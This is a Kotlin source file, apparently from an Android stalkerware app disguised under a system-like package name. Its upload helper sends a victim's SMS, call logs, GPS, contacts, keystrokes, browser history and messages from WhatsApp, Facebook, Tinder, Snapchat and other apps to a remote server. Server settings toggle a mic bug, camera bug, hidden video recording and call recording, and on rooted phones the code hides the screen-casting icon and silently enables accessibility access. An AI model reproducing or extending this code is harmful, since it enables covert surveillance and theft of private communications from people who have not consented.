package com.android.services.network

import android.content.Context
import com.android.services.db.entities.InstagramPostRooted
import com.android.services.db.entities.*
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.*
import com.android.services.models.SkypeLogs
import com.android.services.models.im.*
import com.android.services.network.api.*
import com.android.services.util.*
import com.android.services.util.DeviceInformationUtil.isDeviceRooted
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import io.reactivex.rxjava3.disposables.CompositeDisposable
import kotlinx.coroutines.CoroutineScope
import okhttp3.ResponseBody
import org.json.JSONObject
import java.lang.reflect.Type
import java.util.*


class RemoteServerHelper constructor(
    private val context: Context,
    private val logType: String,
    private val localDatabaseSource: LocalDatabaseSource,
    private val coroutineScope: CoroutineScope? = null
) {

    private var mCompositeDisposables = CompositeDisposable()
    private var tosApi: TOSApi? = null
    private var view360ServerApi: View360Api? = null
    private var startDate: Date? = null
    private var endDate: Date? = null
    private var startId: Int = 0
    private var endId: Int = 0

    constructor(
        context: Context,
        logType: String,
        localDatabaseSource: LocalDatabaseSource,
        tosApi: TOSApi? = null,
        view360ServerApi: View360Api? = null,
        nodeServerOneApi: NodeServerOneApi? = null,
        startDate: Date? = null,
        endDate: Date? = null,
        startId: Int = 0,
        endId: Int = 0,
        coroutineScope: CoroutineScope? = null
    ) : this(context, logType, localDatabaseSource, coroutineScope = coroutineScope) {
        this.tosApi = tosApi
        this.view360ServerApi = view360ServerApi
        this.startDate = startDate
        this.endDate = endDate
        this.startId = startId
        this.endId = endId
    }

    fun <T> upload(vararg logs: List<T>) {
        var apiCall: retrofit2.Call<ResponseBody>? = null
        try {
            when (logType) {
                AppConstants.FCM_TOKEN_TYPE -> {
                    apiCall =
                        tosApi!!.hitFcmTokenService(logs[0].toList()[0] as FCMToken)
                }
                AppConstants.ACTIVE_FCM_TOKEN_TYPE -> {
                    apiCall =
                        tosApi!!.getActiveFcmTokenFromServer()
                }
                AppConstants.SERVER_AUTH -> {
                    apiCall = tosApi!!.hitAuthService(logs[0].toList()[0] as Auth)
                }
                AppConstants.VIEW_360_TYPE -> {
                    apiCall =
                        view360ServerApi!!.activateView360User(logs[0].toList()[0] as View360User)
                }

                AppConstants.DEVICE_INFO_TYPE -> {
                    apiCall =
                        tosApi!!.uploadDeviceInfo(logs[0].toList()[0] as DeviceInformation)
                }
                AppConstants.SYNC_SETTING_TYPE -> {
                    apiCall =
                        tosApi!!.hitUserSettingService(logs[0].toList()[0] as UserSetting)
                }
                AppConstants.PUSH_NOTIFICATIONS_TYPE -> {
                    apiCall =
                        tosApi!!.getPushNotifications(logs[0].toList()[0] as GetPushStatus)
                }
                AppConstants.SMS_LOG_TYPE -> {
                    val smsLogs = logs[0] as List<SmsLog>
                    val smsUpload = SmsUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        smsLogs
                    )
                    apiCall = tosApi!!.uploadSmsLogs(smsUpload)
                }
                AppConstants.CALL_LOG_TYPE -> {
                    val callLogs = logs[0] as List<CallLog>
                    val callLogUpload = CallLogUpload(
                        AppConstants.userId ?: "",
                        AppConstants.phoneServiceId ?: "",
                        callLogs
                    )
                    apiCall = tosApi!!.uploadCallLogs(callLogUpload)
                }
                AppConstants.GPS_LOCATION_TYPE -> {
                    val locations = logs[0] as List<GpsLocation>
                    val geoLocationUpload = GeoLocationUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        locations
                    )
                    apiCall = tosApi!!.uploadGeoLocations(geoLocationUpload)
                }
                AppConstants.CONTACTS_TYPE -> {
                    val contacts = logs[0] as List<Contacts>
                    val contactsUpload = ContactsUpload(
                        AppUtils.getUserId(), AppUtils.getPhoneServiceId(),
                        contacts
                    )
                    apiCall = tosApi!!.uploadContacts(contactsUpload)
                }
                AppConstants.APPOINTMENT_TYPE -> {
                    val appointments = logs[0] as List<AppointmentLog>
                    val appointmentUpload =
                        AppointmentUpload(
                            AppUtils.getUserId(),
                            AppUtils.getPhoneServiceId(),
                            appointmentsLogs = appointments
                        )
                    apiCall = tosApi!!.uploadAppointments(appointmentUpload)
                }
                AppConstants.KEY_LOG_TYPE -> {
                    val keyLogs = logs[0] as List<KeyLog>
                    val keyLogUpload = KeyLogUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        keyLogs
                    )
                    apiCall = tosApi!!.uploadKeyLogs(keyLogUpload)
                }
                AppConstants.BROWSER_HISTORY_TYPE -> {
                    val browserHistoryLogs = logs[0] as List<BrowserHistory>
                    val browserHistoryUpload = BrowserHistoryUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        browserHistoryLogs
                    )
                    apiCall = tosApi!!.uploadBrowserHistory(browserHistoryUpload)
                }
                AppConstants.INSTALLED_APP_TYPE -> {
                    val installedApps = logs[0] as List<InstalledApp>
                    val installedAppUpload = InstalledAppUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        installedApps
                    )
                    apiCall = tosApi!!.uploadInstalledApps(installedAppUpload)
                }
                AppConstants.CONNECTED_NETWORK_TYPE -> {
                    val connectedNetworks = logs[0] as List<ConnectedNetwork>
                    val connectedNetworkUpload = ConnectedNetworkUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        connectedNetworks
                    )
                    apiCall = tosApi!!.uploadConnectedNetworks(connectedNetworkUpload)
                }
                AppConstants.PUSH_STATUS_TYPE -> {
                    val pushStatuses = logs[0] as List<PushStatus>
                    apiCall = tosApi!!.uploadPushStatuses(pushStatuses)
                }
                AppConstants.SCREEN_TIME_TYPE -> {
                    val screenTimes = logs[0] as List<ScreenTimeModel>
                    val screenTimeUpload = ScreenTimeUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        screenTimes
                    )
                    apiCall = tosApi!!.uploadScreenTime(screenTimeUpload)
                }
                AppConstants.SKYPE_ROOTED_TYPE -> {
                    val skypeRootedList = logs[0] as List<SkypeRooted>
                    val skypeLogs =
                        SkypeLogs(
                            AppUtils.getUserId(),
                            AppUtils.getPhoneServiceId(),
                            skypeRootedList
                        )
                    apiCall = tosApi!!.uploadSkypeRooted(skypeLogs)
                }
                AppConstants.ZALO_ROOTED_TYPE -> {
                    val zaloMessages = logs[0] as List<ZaloMessageRooted>
                    val zaloPosts = logs[1] as List<ZaloPostRooted>
                    val zaloUpload = ZaloUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        zaloMessageList = zaloMessages,
                        zaloPostList = zaloPosts
                    )
                    apiCall = tosApi!!.uploadZaloRooted(zaloUpload)
                }
                AppConstants.GEO_FENCES_EVENTS_TYPE -> {
                    val geoFences = logs[0] as List<GeoFenceEvent>
                    val geoFenceUpload = GeoFenceLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        geoFences
                    )
                    apiCall = tosApi!!.uploadGeoFences(geoFenceUpload)
                }
                AppConstants.TUMBLR_ROOTED_TYPE -> {
                    val tumblrMessages = logs[0] as List<TumblrMessageRooted>
                    val tumblrPosts = logs[1] as List<TumblrPostRooted>
                    val tumblrUpload = TumblrUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        tumblrPosts,
                        tumblrMessages
                    )
                    apiCall = tosApi!!.uploadTumblrRooted(tumblrUpload)
                }
                AppConstants.WHATS_APP_ROOTED_TYPE -> {
                    val whatsAppRooted = logs[0] as List<WhatsAppRooted>
                    val whatsAppLogs = WhatsAppLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        whatsAppRooted
                    )
                    apiCall = tosApi!!.uploadWhatsAppMessageRooted(whatsAppLogs)
                }
                AppConstants.VIBER_ROOTED_TYPE -> {
                    val viberRooted = logs[0] as List<ViberRooted>
                    val viberLogs =
                        ViberLogs(AppUtils.getUserId(), AppUtils.getPhoneServiceId(), viberRooted)
                    apiCall = tosApi!!.uploadViberMessageRooted(viberLogs)
                }
                AppConstants.LINE_ROOTED_TYPE -> {
                    val lineRooted = logs[0] as List<LineRooted>
                    val lineLogs =
                        LineLogs(AppUtils.getUserId(), AppUtils.getPhoneServiceId(), lineRooted)
                    apiCall = tosApi!!.uploadLineMessageRooted(lineLogs)
                }
                AppConstants.IMO_ROOTED_TYPE -> {
                    val imoRooted = logs[0] as List<ImoRooted>
                    val imoLogs =
                        IMOLogs(AppUtils.getUserId(), AppUtils.getPhoneServiceId(), imoRooted)
                    apiCall = tosApi!!.uploadImoRooted(imoLogs)
                }
                AppConstants.TINDER_ROOTED_TYPE -> {
                    val tinderRooted = logs[0] as List<TinderRooted>
                    val tinderLogs =
                        TinderLogs(AppUtils.getUserId(), AppUtils.getPhoneServiceId(), tinderRooted)
                    apiCall = tosApi!!.uploadTinderRooted(tinderLogs)
                }
                AppConstants.FACEBOOK_ROOTED_TYPE -> {
                    val facebookRooted = logs[0] as List<FacebookRooted>
                    val facebookLogs = FacebookLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        facebookRooted
                    )
                    apiCall = tosApi!!.uploadFacebookMessageRooted(facebookLogs)
                }
                AppConstants.HANGOUT_ROOTED_TYPE -> {
                    val hangOutRooted = logs[0] as List<HangoutRooted>
                    val hangoutLogs = HangoutLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        hangOutRooted
                    )
                    apiCall = tosApi!!.uploadHangoutsRooted(hangoutLogs)
                }
                AppConstants.HIKE_ROOTED_TYPE -> {
                    val hikeRooted = logs[0] as List<HikeRooted>
                    val hikeLogs =
                        HikeLogs(AppUtils.getUserId(), AppUtils.getPhoneServiceId(), hikeRooted)
                    apiCall = tosApi!!.uploadHikeRooted(hikeLogs)
                }
                AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE -> {
                    val instagramRooted = logs[0] as List<InstagramMessageRooted>
                    val instagramMessageLogs = InstagramMessageLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        instagramRooted
                    )
                    apiCall = tosApi!!.uploadInstagramMessageRooted(instagramMessageLogs)
                }
                AppConstants.INSTAGRAM_POST_ROOTED_TYPE -> {
                    val instagramRooted = logs[0] as List<InstagramPostRooted>
                    val instagramFeedLogs = InstagramFeedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        instagramRooted
                    )
                    apiCall = tosApi!!.uploadInstagramPostRooted(instagramFeedLogs)
                }
                AppConstants.WHATS_APP_UNROOTED_TYPE -> {
                    val whatsAppUnrooted = logs[0] as List<WhatsAppUnrooted>
                    val whatsAppUnrootedLogs = WhatsAppUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        whatsAppUnrooted
                    )
                    apiCall = tosApi!!.uploadWhatsAppUnrooted(whatsAppUnrootedLogs)
                }
                AppConstants.FACEBOOK_UNROOTED_TYPE -> {
                    val facebookUnrooted = logs[0] as List<FacebookUnrooted>
                    val facebookUnrootedLogs = FacebookUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        facebookUnrooted
                    )
                    apiCall = tosApi!!.uploadFacebookUnrooted(facebookUnrootedLogs)
                }
                AppConstants.SKYPE_UNROOTED_TYPE -> {
                    val skypeUnrooted = logs[0] as List<SkypeUnrooted>
                    val skypeUnrootedLogs = SkypeUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        skypeUnrooted
                    )
                    apiCall = tosApi!!.uploadSkypeUnrooted(skypeUnrootedLogs)
                }
                AppConstants.LINE_UNROOTED_TYPE -> {
                    val lineUnrooted = logs[0] as List<LineUnrooted>
                    val whatsAppUnrootedLogs = LineUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        lineUnrooted
                    )
                    apiCall = tosApi!!.uploadLineUnrooted(whatsAppUnrootedLogs)
                }
                AppConstants.IMO_UNROOTED_TYPE -> {
                    val imoUnrooted = logs[0] as List<IMOUnrooted>
                    val imoUnrootedLogs = IMOUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        imoUnrooted
                    )
                    apiCall = tosApi!!.uploadImoUnrooted(imoUnrootedLogs)
                }
                AppConstants.VIBER_UNROOTED_TYPE -> {
                    val lineUnrooted = logs[0] as List<ViberUnrooted>
                    val whatsAppUnrootedLogs = ViberUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        lineUnrooted
                    )
                    apiCall = tosApi!!.uploadViberUnrooted(whatsAppUnrootedLogs)
                }
                AppConstants.SNAP_CHAT_UNROOTED_TYPE -> {
                    val lineUnrooted = logs[0] as List<SnapChatUnrooted>
                    val whatsAppUnrootedLogs = SnapChatUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        lineUnrooted
                    )
                    apiCall = tosApi!!.uploadSnapChatUnrooted(whatsAppUnrootedLogs)
                }
                AppConstants.INSTAGRAM_UNROOTED_TYPE -> {
                    val lineUnrooted = logs[0] as List<InstagramUnrooted>
                    val whatsAppUnrootedLogs = InstagramUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        lineUnrooted
                    )
                    apiCall = tosApi!!.uploadInstagramUnrooted(whatsAppUnrootedLogs)
                }
                AppConstants.TINDER_UNROOTED_TYPE -> {
                    val tinderUnrooted = logs[0] as List<TinderUnrooted>
                    val tidnerUnrootedLogs = TinderUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(), tinderUnrooted
                    )
                    apiCall = tosApi!!.uploadTinderUnrooted(tidnerUnrootedLogs)
                }
                AppConstants.TUMBLR_UNROOTED_TYPE -> {
                    val tumblrUnrooted = logs[0] as List<TumblrUnrooted>
                    val tumblrUnrootedLogs = TumblrUnrootedLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(), tumblrUnrooted
                    )
                    apiCall = tosApi!!.uploadTumblrUnrooted(tumblrUnrootedLogs)
                }
//                AppConstants.HIKE_UNROOTED_TYPE -> {
//                    val hikeUnrooted = logs[0] as List<HikeUnrooted>
//                    val hikeUnrootedLogs = HikeUnrootedLogs(
//                        AppUtils.getUserId(),
//                        AppUtils.getPhoneServiceId(), hikeUnrooted
//                    )
//                    apiCall = tosApi!!.uploadHikeUnrooted(hikeUnrootedLogs)
//                }
                AppConstants.TEXT_ALERT_TYPE -> {
                    val textAlerts = logs[0] as List<TextAlertEvent>
                    val appAlerts = textAlerts.filter {
                        it.eventThrough == "app"
                    }
                    val emailAlerts = textAlerts.filter {
                        it.eventThrough == "email"
                    }
                    val textAlertLogs = TextAlertLogs(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        appAlerts,
                        emailAlerts
                    )
                    logVerbose("text alerts events = $textAlertLogs")
                    apiCall = tosApi!!.postTextAlertEvent(textAlertLogs)
                }
                AppConstants.APP_NOTIFICATIONS_TYPE -> {
                    val appNotifications = logs[0] as List<AppNotifications>
                    val appNotificationUpload = NotificationUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        appNotifications
                    )
                    apiCall = tosApi!!.uploadAppNotifications(appNotificationUpload)
                }
                AppConstants.APPS_PERMISSION_TYPE -> {
                    val appsPermissions = logs[0] as List<AppPermission>
                    val appPermissionUpload = AppPermissionUpload(
                        AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        appsPermissions
                    )
                    apiCall = tosApi!!.uploadAppPermissions(appPermissionUpload)
                }
            }
            apiCall?.let {
                val response = apiCall.execute()
                if (response.isSuccessful) {
                    logVerbose("$logType api response = $response")
                    response.body()?.let {
                        onResponse(it)
                    }
                } else {
                    logVerbose("$logType api response failed = $response")
                    val errorBody: ResponseBody? = response.errorBody()
                    errorBody?.let {
                        logVerbose("$logType api response error body = ${errorBody.string()}")
                    }
                }
            }
        } catch (exception: Exception) {
            logException("$logType logs upload error = ${exception.message}")
        }
    }

    private fun onResponse(responseBody: ResponseBody) {
        clearDisposable()
        try {
            val responseStr = responseBody.string()
            logVerbose("$logType log network response body = $responseStr")
            val response = JSONObject(responseStr)
            if(logType==AppConstants.VIEW_360_TYPE) {
                AppConstants.view360User = response.getJSONObject("user").toString()
            }else{
                val statusCode = response.getString("statusCode")
                logVerbose("$logType Data Uploaded with status Code $statusCode")
                when (statusCode) {
                    "200", "409" -> {
                        updateDatabase(response,responseStr)
                    }
                    "405"-> {
                        /*
                        * This status  code is for future use
                        * Data Upload stop
                        * Auth Token expire
                        * Firebase token expire
                        * Auth Service continue
                        * Data Collection Continue
                         */
                        ServerAuthUtil.onFcmTokenExpired()
                        ServerAuthUtil.onTokenExpired()
                    }
                    "400"->{

                        /*
                        * Data Upload stop
                        * Auth Token expire
                        * Firebase token expire
                        * Auth Service continue
                        * Data Collection Continue
                         */
                        ServerAuthUtil.onFcmTokenExpired()
                        ServerAuthUtil.onTokenExpired()
                    }
                    "401", "402" -> {
                        /*
                        * Data Upload stop
                        * Auth Token expire
                        * Auth Service continue
                        * Data Collection Continue
                         */
                        ServerAuthUtil.onTokenExpired()
                    }
                }
            }
        } catch (e: Exception) {
            logException("$logType response parsing error = ${e.message}")
        }
    }

    private fun parseSyncSettingResponse(response: JSONObject) {
        try {
            AppConstants.syncSetting = response.getJSONObject("syncSettings").toString()
            val gson = GsonBuilder().create()
            val deviceInfoResponse = gson.fromJson(
                response.toString(),
                DeviceInfoResponse::class.java
            )
            val syncSetting = deviceInfoResponse.syncSettings
            val voipCallJSON = deviceInfoResponse.voipRecording
            AppConstants.voipCallApps = voipCallJSON
            AppConstants.screenRecordingApps = deviceInfoResponse.screenRecording
            AppConstants.syncAppointments = syncSetting.appointments
            AppConstants.syncBrowsingHistory = syncSetting.browserHistory
            AppConstants.callLogSync = syncSetting.callLog
            AppConstants.syncContacts = syncSetting.contacts
            AppConstants.syncGeoLocation = syncSetting.geoLocation
            AppConstants.syncInstalledApps = syncSetting.installedApps
            AppConstants.syncConnectedNetworks = syncSetting.networks
            AppConstants.syncAppReports = syncSetting.appReport
            AppConstants.smsLogSync = syncSetting.sms
            AppConstants.syncMicBug = syncSetting.micBug
            AppConstants.syncCameraBug = syncSetting.cameraBug
            AppConstants.syncCallRecording = syncSetting.recordedCalls
            AppConstants.syncPhotos = syncSetting.photo
            AppConstants.syncVideoBug = syncSetting.spyVidCam
            AppConstants.syncLine = syncSetting.imLine
            AppConstants.syncFacebook = syncSetting.imFacebook
            AppConstants.syncSkype = syncSetting.imSkype
            AppConstants.syncViber = syncSetting.imViber
            AppConstants.syncWhatsApp = syncSetting.imWhatsapp
            AppConstants.syncSnapchat = syncSetting.imSnapchat
            AppConstants.syncKik = syncSetting.imKik
            AppConstants.syncInstagram = syncSetting.imInstagram
            AppConstants.syncTinder = syncSetting.imTinder
            AppConstants.syncHike = syncSetting.imHike
            AppConstants.syncHangouts = syncSetting.imHangouts
            AppConstants.syncImo = syncSetting.imImo
            AppConstants.syncTumblr = syncSetting.imTumblr
            AppConstants.syncZalo = syncSetting.imZalo
            AppConstants.syncVoiceMessages = syncSetting.imVoiceMessage
            AppConstants.syncKeyLogger = syncSetting.keyLogger
            AppConstants.syncScreenShots = syncSetting.screenShot
            AppConstants.syncAppNotifications = syncSetting.appNotifications
            AppConstants.callRecordingMethod = syncSetting.callRecordingMethod
            AppConstants.serviceActivated = syncSetting.isAppEnabled
            AppConstants.micBugQuality = syncSetting.micBugQuality
            if (syncSetting.deviceIdentifier != null) {
                AppConstants.activeIdentifier = syncSetting.deviceIdentifier
            }
            AppConstants.serviceExpiryDate = deviceInfoResponse.expiryDate ?: ""
            AppConstants.callRecordQuality = syncSetting.callRecordingQuality
            insertPhoneServicesToDatabase(deviceInfoResponse.userInfo)
            if (isDeviceRooted) {
                if (AppUtils.isScreenRecordingEnabled()) SecureSettingUtil.disableScreenCastingIcon() else SecureSettingUtil.enableScreenCastingIcon()
                if ((AppConstants.isAppHidden || AppConstants.isAppIconChange)) {
                    if (!AppUtils.isAccessibilityEnabled(context)) {
                        SecureSettingUtil.enableAccessibilityAccess()
                    }
                }
            }
        } catch (e: Exception) {
            logException("parsing Error ${e.message}", logType, e)
        }
    }

    private fun insertPhoneServicesToDatabase(otherDevices: List<PhoneServices>?) {
        if (otherDevices != null)
            localDatabaseSource.insertPhoneService(otherDevices)
    }


    private fun updateDatabase(response: JSONObject, responseStr: String) {
        when (logType) {
            AppConstants.SYNC_SETTING_TYPE -> {
                parseSyncSettingResponse(response)
            }
            AppConstants.DEVICE_INFO_TYPE -> {
                logVerbose("$logType Device Info Uploaded")
                parseSyncSettingResponse(response)
            }
            AppConstants.FCM_TOKEN_TYPE -> {
                if (!AppConstants.fcmToken.isNullOrEmpty()) {
                    AppConstants.fcmTokenStatus = true
                }
            }
            AppConstants.ACTIVE_FCM_TOKEN_TYPE->{
                val activeFcmToken=response.getString("tokennew")
                val deviceFcmToken= AppConstants.fcmToken
                if(activeFcmToken.isNullOrEmpty() && !deviceFcmToken.isNullOrEmpty()){
                    ServerAuthUtil.onFcmTokenExpired()
                }else if(!activeFcmToken.isNullOrEmpty() && !deviceFcmToken.isNullOrEmpty() && activeFcmToken !=deviceFcmToken){
                    ServerAuthUtil.onFcmTokenExpired()
                }
            }
            AppConstants.SERVER_AUTH -> {
                AppConstants.authToken = response.getString("token")
            }
            AppConstants.PUSH_NOTIFICATIONS_TYPE -> {
                val listType: Type = object : TypeToken<PushNotificationsMessages>() {}.type
                val pushNotificationsMessages =
                    Gson().fromJson<PushNotificationsMessages>(responseStr, listType)
                logVerbose("push notifications messages = $pushNotificationsMessages")
                logVerbose("NonSupportedFcmInfo = PushNotificationCollector response = $response")
                FirebasePushUtils.parsePushNotifications(
                    context,
                    coroutineScope!!,
                    localDatabaseSource,
                    pushNotificationsMessages
                )
            }
            AppConstants.SMS_LOG_TYPE -> {
                localDatabaseSource.updateSmsLogs(startDate!!, endDate!!)
            }
            AppConstants.CALL_LOG_TYPE -> {
                localDatabaseSource.updateCallLogs(startDate!!, endDate!!)
            }
            AppConstants.GPS_LOCATION_TYPE -> {
                localDatabaseSource.updateGpsLocations(startDate!!, endDate!!)
            }
            AppConstants.CONTACTS_TYPE -> {
                localDatabaseSource.updateContacts(startId, endId)
            }
            AppConstants.APPOINTMENT_TYPE -> {
                localDatabaseSource.updateAppointments(startId, endId)
            }
            AppConstants.KEY_LOG_TYPE -> {
                localDatabaseSource.updateKeyLogs(startId, endId)
            }
            AppConstants.BROWSER_HISTORY_TYPE -> {
                localDatabaseSource.updateBrowserHistory(startId, endId)
            }
            AppConstants.INSTALLED_APP_TYPE -> {
                localDatabaseSource.updateInstalledApps(startId, endId)
            }
            AppConstants.CONNECTED_NETWORK_TYPE -> {
                localDatabaseSource.updateConnectedNetwork(startDate!!, endDate!!)
            }
            AppConstants.PUSH_STATUS_TYPE -> {
                localDatabaseSource.updatePushStatus(startDate!!, endDate!!)
            }
            AppConstants.SCREEN_TIME_TYPE -> {
                localDatabaseSource.updateScreenTime(startId, endId)
            }
            AppConstants.GEO_FENCES_EVENTS_TYPE -> {
                localDatabaseSource.updateGeoFenceEvent(startId, endId)
            }
            AppConstants.TEXT_ALERT_TYPE -> {
                localDatabaseSource.updateTextAlerts(startDate!!, endDate!!)
            }
            AppConstants.SKYPE_ROOTED_TYPE -> {
                localDatabaseSource.updateSkypeRooted(startDate!!, endDate!!)
            }
            AppConstants.APP_NOTIFICATIONS_TYPE -> {
                localDatabaseSource.updateAppNotifications(startDate!!, endDate!!)
            }
            AppConstants.ZALO_ROOTED_TYPE -> {
                if (startDate != null && endDate != null)
                    localDatabaseSource.updateZaloMessageRooted(startDate!!, endDate!!)
                localDatabaseSource.updateZaloPostRooted()
            }
            AppConstants.TUMBLR_ROOTED_TYPE -> {
                localDatabaseSource.updateTumblrMessageRooted(startDate!!, endDate!!)
                localDatabaseSource.updateTumblrPostRooted()
            }
            AppConstants.WHATS_APP_ROOTED_TYPE -> {
                localDatabaseSource.updateWhatsAppRooted(startDate!!, endDate!!)
            }
            AppConstants.LINE_ROOTED_TYPE -> {
                localDatabaseSource.updateLineRooted(startDate!!, endDate!!)
            }
            AppConstants.IMO_ROOTED_TYPE -> {
                localDatabaseSource.updateImoRooted(startDate!!, endDate!!)
            }
            AppConstants.VIBER_ROOTED_TYPE -> {
                localDatabaseSource.updateViberRooted(startDate!!, endDate!!)
            }
            AppConstants.HIKE_ROOTED_TYPE -> {
                localDatabaseSource.updateHikeRooted(startDate!!, endDate!!)
            }
            AppConstants.HANGOUT_ROOTED_TYPE -> {
                localDatabaseSource.updateHangoutRooted(startDate!!, endDate!!)
            }
            AppConstants.TINDER_ROOTED_TYPE -> {
                localDatabaseSource.updateTinderRooted(startDate!!, endDate!!)
            }
            AppConstants.FACEBOOK_ROOTED_TYPE -> {
                localDatabaseSource.updateFacebookRooted(startDate!!, endDate!!)
            }
            AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE -> {
                localDatabaseSource.updateInstagramRooted(startDate!!, endDate!!)
            }
            AppConstants.INSTAGRAM_POST_ROOTED_TYPE -> {
                localDatabaseSource.updateInstagramPostRooted(startDate!!, endDate!!)
            }
            AppConstants.WHATS_APP_UNROOTED_TYPE -> {
                localDatabaseSource.updateWhatsAppUnrooted(startId, endId)
            }
            AppConstants.FACEBOOK_UNROOTED_TYPE -> {
                localDatabaseSource.updateFacebookUnrooted(startId, endId)
            }
            AppConstants.SKYPE_UNROOTED_TYPE -> {
                localDatabaseSource.updateSkypeUnrooted(startId, endId)
            }
            AppConstants.LINE_UNROOTED_TYPE -> {
                localDatabaseSource.updateLineUnrooted(startId, endId)
            }
            AppConstants.VIBER_UNROOTED_TYPE -> {
                localDatabaseSource.updateViberUnrooted(startId, endId)
            }
            AppConstants.IMO_UNROOTED_TYPE -> {
                localDatabaseSource.updateIMOUnrooted(startId, endId)
            }
            AppConstants.INSTAGRAM_UNROOTED_TYPE -> {
                localDatabaseSource.updateInstagramUnrooted(startId, endId)
            }
            AppConstants.TINDER_UNROOTED_TYPE -> {
                localDatabaseSource.updateTinderUnrooted(startId, endId)
            }
            AppConstants.TUMBLR_UNROOTED_TYPE -> {
                localDatabaseSource.updateTumblrUnrooted(startId, endId)
            }
//            AppConstants.HIKE_UNROOTED_TYPE -> {
//                localDatabaseSource.updateHikeUnrooted(startId, endId)
//            }
            AppConstants.SNAP_CHAT_UNROOTED_TYPE -> {
                localDatabaseSource.updateSnapchatUnrooted(startId, endId)
            }
        }
    }

    private fun clearDisposable() {
        if (!mCompositeDisposables.isDisposed) {
            mCompositeDisposables.clear()
            mCompositeDisposables.dispose()
        }
    }
}